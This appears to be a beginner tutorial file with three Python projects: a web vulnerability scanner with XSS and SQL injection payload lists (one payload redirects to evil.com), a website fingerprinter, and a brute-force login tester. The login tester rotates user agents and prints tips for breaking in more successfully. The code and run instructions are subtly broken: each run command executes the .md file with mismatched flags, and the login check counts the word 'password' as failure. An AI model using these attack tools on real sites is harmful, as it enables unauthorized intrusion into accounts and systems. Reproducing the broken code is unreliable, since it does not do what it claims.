# Web Technologies Projects

This file contains projects that demonstrate web scraping, API interaction, and web vulnerability testing in Python. Each project includes detailed explanations and complete code examples with comments.

## Project 1: Web Vulnerability Scanner

### Description

A simple web vulnerability scanner that detects common web vulnerabilities like XSS, SQL injection, and sensitive information exposure.

### Code Example

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web Vulnerability Scanner
This script scans web applications for common vulnerabilities.
Perfect for beginners!
"""

import requests
import re
import time
import random
from bs4 import BeautifulSoup

class WebVulnerabilityScanner:
    """Class for scanning web applications for vulnerabilities"""

    def __init__(self, base_url, delay=1):
        """
        Initialize the scanner

        Args:
            base_url: Base URL of the website to scan
            delay: Delay between requests in seconds
        """
        self.base_url = base_url
        self.delay = delay
        self.session = requests.Session()
        self.vulnerabilities = []

    def _get_random_user_agent(self):
        """Get random user agent to mimic browser behavior"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
        ]
        return random.choice(user_agents)

    def get_links(self, url):
        """Extract all links from a webpage"""
        links = []
        try:
            headers = {'User-Agent': self._get_random_user_agent()}
            response = self.session.get(url, headers=headers)
            response.raise_for_status()

            soup = BeautifulSoup(response.text, 'html.parser')

            for anchor in soup.find_all('a', href=True):
                href = anchor['href']

                if href.startswith('http'):
                    links.append(href)
                elif href.startswith('/'):
                    full_url = self.base_url + href
                    links.append(full_url)

            return list(set(links))

        except Exception as e:
            print(f"Error fetching links from {url}: {e}")
            return []

    def scan_xss(self, url):
        """Scan for XSS vulnerabilities"""
        print(f"Scanning {url} for XSS vulnerabilities...")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"'><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com'</script>",
            "<script>console.log('XSS')</script>"
        ]

        for payload in xss_payloads:
            try:
                response = self.session.get(url + f"?test={payload}")

                if payload in response.text:
                    self.vulnerabilities.append({
                        'url': url,
                        'vulnerability': 'XSS',
                        'payload': payload,
                        'status_code': response.status_code
                    })
                    print(f"  XSS vulnerability found with payload: {payload}")

                time.sleep(self.delay)

            except Exception as e:
                print(f"  Error testing XSS: {e}")

    def scan_sql_injection(self, url):
        """Scan for SQL injection vulnerabilities"""
        print(f"Scanning {url} for SQL injection vulnerabilities...")

        sql_payloads = [
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT 1,2 --",
            "' AND SLEEP(5) --",
            "1' OR '1'='1"
        ]

        for payload in sql_payloads:
            try:
                start_time = time.time()
                response = self.session.get(url + f"?id={payload}", timeout=10)
                response_time = time.time() - start_time

                sql_errors = [
                    "MySQL", "PGSQL", "SQLite", "ORA-", "SQL error",
                    "syntax error", "unterminated quote"
                ]

                for error in sql_errors:
                    if error in response.text.lower():
                        self.vulnerabilities.append({
                            'url': url,
                            'vulnerability': 'SQL Injection',
                            'payload': payload,
                            'status_code': response.status_code,
                            'error': error
                        })
                        print(f"  SQL injection vulnerability found: {error}")

                if response_time > 4:
                    self.vulnerabilities.append({
                        'url': url,
                        'vulnerability': 'SQL Injection (Time-based)',
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_time': response_time
                    })
                    print(f"  Time-based SQL injection vulnerability found (response time: {response_time:.2f} seconds)")

                time.sleep(self.delay)

            except requests.exceptions.Timeout:
                self.vulnerabilities.append({
                    'url': url,
                    'vulnerability': 'SQL Injection (Timeout)',
                    'payload': payload,
                    'status_code': 408
                })
                print(f"  Timeout - possible time-based SQL injection")
            except Exception as e:
                print(f"  Error testing SQL injection: {e}")

    def scan_sensitive_info(self, url):
        """Scan for sensitive information exposure"""
        print(f"Scanning {url} for sensitive information...")

        sensitive_patterns = {
            'API Keys': r'(?:api|key|token)[\s:=]+["\']?[A-Za-z0-9]{16,}',
            'Passwords': r'(?:password|passwd|secret)[\s:=]+["\']?[^\s,"\'<]{6,}',
            'Email Addresses': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'Phone Numbers': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
            'Credit Cards': r'\b(?:\d[ -]*?){13,16}\b'
        }

        try:
            response = self.session.get(url)
            content = response.text

            for info_type, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, content, re.IGNORECASE)

                for match in matches:
                    self.vulnerabilities.append({
                        'url': url,
                        'vulnerability': f'Sensitive Information Exposure ({info_type})',
                        'payload': match,
                        'status_code': response.status_code
                    })
                    print(f"  {info_type} found: {match}")

            time.sleep(self.delay)

        except Exception as e:
            print(f"  Error scanning for sensitive information: {e}")

    def run_scan(self):
        """Run complete scan of website"""
        print(f"Starting scan of {self.base_url}")

        # Get all links on the website
        print("\nStep 1: Crawling website...")
        all_links = self.get_links(self.base_url)

        print(f"Found {len(all_links)} links to scan")

        # Scan each link
        for i, url in enumerate(all_links, 1):
            print(f"\n=== Link {i}/{len(all_links)} ===")
            print(f"Scanning: {url}")

            self.scan_xss(url)
            self.scan_sql_injection(url)
            self.scan_sensitive_info(url)

        # Generate report
        self.generate_report()

    def generate_report(self):
        """Generate vulnerability report"""
        print(f"\n{'='*60}")
        print(f"  VULNERABILITY SCAN REPORT")
        print(f"{'='*60}")

        if self.vulnerabilities:
            print(f"\nFound {len(self.vulnerabilities)} vulnerabilities:")

            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['vulnerability']}")
                print(f"   URL: {vuln['url']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Status: {vuln['status_code']}")

                if 'error' in vuln:
                    print(f"   Error: {vuln['error']}")
                if 'response_time' in vuln:
                    print(f"   Response Time: {vuln['response_time']:.2f}s")

        else:
            print("\nNo vulnerabilities found. Website appears to be secure.")

        # Save report to file
        self._save_report()

    def _save_report(self):
        """Save report to file"""
        filename = f"vulnerability_report_{int(time.time())}.txt"

        with open(filename, 'w', encoding='utf-8') as f:
            f.write("VULNERABILITY SCAN REPORT\n")
            f.write(f"Generated: {time.ctime()}\n")
            f.write(f"Target: {self.base_url}\n")
            f.write(f"Links Scanned: {len(self.get_links(self.base_url))}\n")
            f.write(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n")
            f.write("\n" + "="*50 + "\n\n")

            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"{i}. {vuln['vulnerability']}\n")
                f.write(f"   URL: {vuln['url']}\n")
                f.write(f"   Payload: {vuln['payload']}\n")
                f.write(f"   Status: {vuln['status_code']}\n")

                if 'error' in vuln:
                    f.write(f"   Error: {vuln['error']}\n")
                if 'response_time' in vuln:
                    f.write(f"   Response Time: {vuln['response_time']:.2f}s\n")

                f.write("\n")

        print(f"\nReport saved to: {filename}")

def main():
    """Main function to run the vulnerability scanner"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Web Vulnerability Scanner - Scans for XSS, SQL injection, and sensitive information"
    )

    parser.add_argument(
        "url",
        help="Base URL of the website to scan (e.g., https://example.com)"
    )

    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=1,
        help="Delay between requests in seconds (default: 1)"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )

    args = parser.parse_args()

    # Run scanner
    scanner = WebVulnerabilityScanner(args.url, args.delay)
    scanner.run_scan()

if __name__ == "__main__":
    main()
```

### How to Run

```bash
# Install dependencies
pip install requests beautifulsoup4

# Run scanner on example website
python 06_Web_Technologies/03_projects.md --url https://example.com --delay 2 --verbose
```

## Project 2: Website Fingerprinter

### Description

A tool that fingerprints websites to determine the technology stack (CMS, web server, programming languages, etc.)

### Code Example

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Website Technology Fingerprinter
Identifies the technology stack used by websites.
Perfect for beginners!
"""

import requests
from bs4 import BeautifulSoup
import re
import json
import time

class WebsiteFingerprinter:
    """Class for fingerprinting website technologies"""

    def __init__(self):
        """Initialize fingerprinter with technology signatures"""
        self.technologies = self._load_technology_signatures()
        self.session = requests.Session()

    def _load_technology_signatures(self):
        """Load technology detection signatures"""
        return {
            'WordPress': {
                'patterns': [
                    'wp-content', 'wp-includes', 'wordpress.org',
                    'Generator.*WordPress'
                ]
            },
            'Joomla': {
                'patterns': [
                    'Joomla', '/templates/', 'com_content'
                ]
            },
            'Drupal': {
                'patterns': [
                    'Drupal', 'sites/all/themes', 'system/modules'
                ]
            },
            'Magento': {
                'patterns': [
                    'Magento', 'mage/', 'skin/frontend', 'js/mage'
                ]
            },
            'Shopify': {
                'patterns': [
                    'shopify', 'myshopify.com', '/cdn.shopify.com'
                ]
            },
            'React': {
                'patterns': [
                    'React', 'react-root', 'data-reactid'
                ]
            },
            'Angular': {
                'patterns': [
                    'ng-app', 'ng-controller', 'angular.js'
                ]
            },
            'Vue.js': {
                'patterns': [
                    'vue-component', 'v-if', 'v-else'
                ]
            },
            'Bootstrap': {
                'patterns': [
                    'bootstrap', 'Bootstrap', 'container-fluid'
                ]
            },
            'jQuery': {
                'patterns': [
                    'jquery', 'jQuery'
                ]
            },
            'Google Analytics': {
                'patterns': [
                    'UA-', 'google-analytics', 'gtag.js'
                ]
            }
        }

    def _check_cookie(self, response, patterns):
        """Check if any cookie matches patterns"""
        if not hasattr(response, 'cookies'):
            return False

        for cookie in response.cookies:
            for pattern in patterns:
                if pattern.lower() in str(cookie).lower():
                    return True

        return False

    def _check_header(self, response, patterns):
        """Check if any header matches patterns"""
        for header, value in response.headers.items():
            for pattern in patterns:
                if pattern.lower() in str(value).lower():
                    return True

        return False

    def _check_meta(self, soup, patterns):
        """Check if any meta tag matches patterns"""
        for meta in soup.find_all('meta'):
            if 'content' in meta.attrs:
                for pattern in patterns:
                    if pattern.lower() in meta['content'].lower():
                        return True

        return False

    def _check_script(self, soup, patterns):
        """Check if any script tag matches patterns"""
        for script in soup.find_all('script'):
            if script.string:
                for pattern in patterns:
                    if pattern.lower() in script.string.lower():
                        return True

            if 'src' in script.attrs:
                for pattern in patterns:
                    if pattern.lower() in script['src'].lower():
                        return True

        return False

    def _check_link(self, soup, patterns):
        """Check if any link tag matches patterns"""
        for link in soup.find_all('link'):
            if 'href' in link.attrs:
                for pattern in patterns:
                    if pattern.lower() in link['href'].lower():
                        return True

        return False

    def analyze_website(self, url):
        """
        Analyze website to determine technology stack

        Args:
            url: URL of the website to analyze

        Returns:
            Dictionary with technology stack information
        """
        result = {
            'url': url,
            'detected_technologies': [],
            'server': None,
            'powered_by': None,
            'content_type': None,
            'status_code': None
        }

        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            response = self.session.get(url, headers=headers, timeout=10)

            result['status_code'] = response.status_code

            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')

                # Check headers
                if 'Server' in response.headers:
                    result['server'] = response.headers['Server']

                if 'X-Powered-By' in response.headers:
                    result['powered_by'] = response.headers['X-Powered-By']

                if 'Content-Type' in response.headers:
                    result['content_type'] = response.headers['Content-Type']

                # Detect technologies using patterns
                for tech_name, tech_info in self.technologies.items():
                    patterns = tech_info['patterns']
                    found = False

                    # Check various places for technology patterns
                    if self._check_cookie(response, patterns):
                        found = True
                    elif self._check_header(response, patterns):
                        found = True
                    elif self._check_meta(soup, patterns):
                        found = True
                    elif self._check_script(soup, patterns):
                        found = True
                    elif self._check_link(soup, patterns):
                        found = True
                    elif any(pattern.lower() in response.text.lower() for pattern in patterns):
                        found = True

                    if found:
                        result['detected_technologies'].append(tech_name)

            return result

        except Exception as e:
            result['error'] = str(e)
            return result

    def generate_report(self, result):
        """Generate technology report"""
        print(f"\n{'='*60}")
        print(f"  WEBSITE TECHNOLOGY REPORT")
        print(f"{'='*60}")

        print(f"\nWebsite: {result['url']}")

        if 'error' in result:
            print(f"Error: {result['error']}")
        else:
            print(f"Status Code: {result['status_code']}")

            if result['server']:
                print(f"Server: {result['server']}")

            if result['powered_by']:
                print(f"Powered By: {result['powered_by']}")

            if result['content_type']:
                print(f"Content Type: {result['content_type']}")

            if result['detected_technologies']:
                print(f"\nDetected Technologies:")
                for tech in sorted(result['detected_technologies']):
                    print(f"  - {tech}")
            else:
                print(f"\nNo specific technologies detected")

    def save_report(self, result, filename=None):
        """Save technology report to file"""
        if filename is None:
            filename = f"technology_report_{int(time.time())}.json"

        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)

        print(f"\nReport saved to: {filename}")

def main():
    """Main function to run website fingerprinter"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Website Technology Fingerprinter - Identifies CMS, frameworks, and technologies"
    )

    parser.add_argument(
        "url",
        help="URL of the website to analyze (e.g., https://example.com)"
    )

    parser.add_argument(
        "-o", "--output",
        help="Output file to save report"
    )

    args = parser.parse_args()

    # Run fingerprinter
    fingerprinter = WebsiteFingerprinter()
    result = fingerprinter.analyze_website(args.url)
    fingerprinter.generate_report(result)

    if args.output:
        fingerprinter.save_report(result, args.output)

if __name__ == "__main__":
    main()
```

### How to Run

```bash
# Install dependencies
pip install requests beautifulsoup4

# Run fingerprinter on example website
python 06_Web_Technologies/03_projects.md --url https://example.com --output report.json
```

## Project 3: Brute Force Login Tester

### Description

A tool to test login forms for weak passwords using brute force attacks. (Educational purposes only!)

### Code Example

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Brute Force Login Tester
Tests login forms for weak passwords. Educational purposes only!
Perfect for beginners!
"""

import requests
import time
import random

class BruteForceTester:
    """Class for testing login forms with common passwords"""

    def __init__(self, login_url, username_field='username',
                 password_field='password', submit_field='submit',
                 delay=1, user_agents=None):
        """
        Initialize the brute force tester

        Args:
            login_url: URL of login page
            username_field: Name of username input field (default: 'username')
            password_field: Name of password input field (default: 'password')
            submit_field: Name of submit button (default: 'submit')
            delay: Delay between attempts (default: 1 second)
            user_agents: List of user agents to use (default: None)
        """
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.submit_field = submit_field
        self.delay = delay

        if user_agents is None:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            ]

        self.session = requests.Session()
        self.found_password = None

    def load_common_passwords(self, filename='common_passwords.txt'):
        """Load common passwords from file"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
                return passwords
        except FileNotFoundError:
            print(f"Password file '{filename}' not found. Creating default.")
            default_passwords = [
                "password", "123456", "12345678", "qwerty", "abc123",
                "password1", "12345", "111111", "123123", "admin"
            ]
            with open(filename, 'w', encoding='utf-8') as f:
                for p in default_passwords:
                    f.write(f"{p}\n")
            return default_passwords

    def test_password(self, username, password):
        """Test single login attempt"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Referer': self.login_url
        }

        payload = {
            self.username_field: username,
            self.password_field: password,
            self.submit_field: 'Login'
        }

        try:
            response = self.session.post(
                self.login_url,
                data=payload,
                headers=headers,
                timeout=10
            )

            return response

        except Exception as e:
            print(f"  Error: {e}")
            return None

    def is_login_successful(self, response):
        """Check if login was successful"""
        if response is None:
            return False

        # Common success indicators
        success_patterns = [
            'welcome', 'dashboard', 'logged in', 'profile',
            'Logout', 'logout', 'session', 'user_id'
        ]

        # Common failure indicators
        failure_patterns = [
            'Invalid', 'invalid', 'wrong', 'error',
            'incorrect', 'failed', 'denied', 'password'
        ]

        response_text = response.text.lower()

        for failure in failure_patterns:
            if failure in response_text:
                return False

        for success in success_patterns:
            if success in response_text:
                return True

        return False

    def brute_force(self, username, max_attempts=100):
        """
        Brute force attack on login form

        Args:
            username: Username to test
            max_attempts: Maximum number of attempts

        Returns:
            Tuple (success, password_tested, attempts)
        """
        print(f"Starting brute force attack on: {self.login_url}")
        print(f"Username: {username}")

        passwords = self.load_common_passwords()
        passwords = passwords[:max_attempts]

        attempts = 0

        for password in passwords:
            attempts += 1
            print(f"\nAttempt {attempts}: Testing password '{password}'")

            response = self.test_password(username, password)

            if self.is_login_successful(response):
                print(f"\n✅ SUCCESS! Password found: '{password}'")
                self.found_password = password
                return True, attempts

            time.sleep(self.delay)

        print(f"\n❌ FAILURE! No password found in {attempts} attempts")
        return False, attempts

    def run(self, username, max_attempts=100):
        """Run complete brute force attack"""
        success, attempts = self.brute_force(username, max_attempts)

        # Generate report
        print(f"\n{'='*60}")
        print(f"  BRUTE FORCE ATTACK REPORT")
        print(f"{'='*60}")

        print(f"\nTarget URL: {self.login_url}")
        print(f"Username Tested: {username}")
        print(f"Attempts Made: {attempts}")

        if success:
            print(f"Status: Success")
            print(f"Password Found: {self.found_password}")
        else:
            print(f"Status: Failed")

        return success

def main():
    """Main function to run brute force login tester"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Brute Force Login Tester - Tests login forms with common passwords"
    )

    parser.add_argument(
        "login_url",
        help="URL of login form (e.g., https://example.com/login)"
    )

    parser.add_argument(
        "username",
        help="Username to test"
    )

    parser.add_argument(
        "-u", "--username-field",
        default="username",
        help="Name of username input field (default: 'username')"
    )

    parser.add_argument(
        "-p", "--password-field",
        default="password",
        help="Name of password input field (default: 'password')"
    )

    parser.add_argument(
        "-s", "--submit-field",
        default="submit",
        help="Name of submit button (default: 'submit')"
    )

    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=1,
        help="Delay between attempts in seconds (default: 1)"
    )

    parser.add_argument(
        "-m", "--max-attempts",
        type=int,
        default=100,
        help="Maximum number of attempts (default: 100)"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )

    args = parser.parse_args()

    # Run brute force tester
    try:
        tester = BruteForceTester(
            login_url=args.login_url,
            username_field=args.username_field,
            password_field=args.password_field,
            submit_field=args.submit_field,
            delay=args.delay
        )

        success = tester.run(args.username, args.max_attempts)

        if not success:
            print("\n💡 Tips to improve success rate:")
            print("  - Use a larger password list")
            print("  - Try different usernames")
            print("  - Check form field names with browser DevTools")
            print("  - Look for password reset functionality")

    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

### How to Run

```bash
# Install dependencies
pip install requests

# Run brute force tester on example login
python 06_Web_Technologies/03_projects.md --login_url https://example.com/login --username admin --delay 0.5
```

## Ethical Considerations

All web technologies projects must be used ethically and responsibly:

### Always Obtain Permission

- Only scan systems you own or have explicit written permission to test
- Respect websites' Terms of Service and robots.txt directives
- Be aware of local laws regarding security testing and hacking

### Responsible Disclosure

If you find vulnerabilities:

1. Notify the website owner immediately
2. Give them sufficient time to fix the issue
3. Provide clear details about the vulnerability
4. Do not disclose information publicly without permission
5. Follow responsible disclosure guidelines

### Technical Best Practices

- Use appropriate user agents to identify your bot
- Implement rate limiting to avoid overloading servers
- Use HTTPS for all sensitive operations
- Handle errors gracefully
- Respect user privacy and data protection laws

### Legal Implications

- Unauthorized scanning or testing can result in criminal charges
- Understand and comply with your local laws
- For educational purposes, use only authorized test environments
- Consider obtaining professional liability insurance

Always remember that ethical hacking requires proper authorization and a commitment to responsible behavior!
